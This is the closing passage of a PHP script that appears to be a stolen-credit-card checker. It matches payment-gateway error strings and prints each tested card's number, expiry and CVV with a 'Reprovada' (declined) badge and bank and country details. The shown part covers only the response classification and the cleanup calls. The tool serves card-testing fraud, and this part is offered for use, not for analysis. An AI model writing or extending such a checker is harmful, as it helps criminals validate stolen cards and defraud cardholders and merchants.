  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>processing_error [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2, "service_not_allowed")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Service Not Allowed [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result2,  "parameter_invalid_empty")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Declined : Missing Card Details [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "lock_timeout")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Another Request In Process : Card Not Checked [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "transaction_not_allowed")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support Purchase [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result2,  'Card is declined by your bank, please contact them for additional information.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2, "missing_payment_information")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Payment Informations [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Credit Card Number [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif 
(strpos($result2,  '-1')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='white'><font class='badge badge-light'> Update Nonce [ SØÊÑ ] </i></font> <br> <font class='badge badge-primary'>$bank [$country] - $type</i></font> <br>";
}

else {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card was Declined due to an Unknown Error [ SØÊÑ ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

curl_close($ch);
ob_flush();

//echo $result1;
//echo $result2;

?>